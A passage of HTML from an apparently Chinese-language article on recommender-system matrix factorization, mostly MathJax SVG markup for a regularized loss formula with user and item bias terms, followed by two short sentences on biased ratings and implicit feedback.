554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(4497, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4886, 0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(451, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(572, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(850, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(6454.2, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(7454.4, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(8399.6, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(9399.8, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(10505.5, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(11505.8, 0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(12754.4, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msubsup" transform="translate(13476.7, 0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(485, -247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msup" transform="translate(14509.5, 0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(389, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(15524.2, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(16524.5, 0)"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mo" transform="translate(17107.5, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(17496.5, 0)"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(18274.2, 0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msup" transform="translate(19578.5, 0)"><g data-mml-node="mo"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="mn" transform="translate(500, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(20759.8, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(21815.6, 0)"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(22593.4, 0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msup" transform="translate(23650.1, 0)"><g data-mml-node="mo"><path data-c="2225" d="M133 736Q138 750 153 750Q164 750 170 739Q172 735 172 250T170 -239Q164 -250 152 -250Q144 -250 138 -244L137 -243Q133 -241 133 -179T132 250Q132 731 133 736ZM329 739Q334 750 346 750Q353 750 361 744L362 743Q366 741 366 679T367 250T367 -178T362 -243L361 -244Q355 -250 347 -250Q335 -250 329 -239Q327 -235 327 250T329 739Z"></path></g><g data-mml-node="mn" transform="translate(500, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(24831.4, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(25609.4, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mn" transform="translate(429, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(429, -247) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(26715.1, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(27715.3, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mn" transform="translate(429, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(429, -247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(28547.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -1437.1 1 2374.1"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-9" transform="translate(0, 487.1)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>其中<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex" xmlns="http://www.w3.org/2000/svg" width="3.045ex" height="1.65ex" role="img" focusable="false" viewBox="0 -442 1346 729.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(451, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(572, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(850, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg></mjx-container></span>为包含用户偏见和物品偏置的评分。</p>
<p>当加入了用户对物品的隐式行为，评分变为</p>
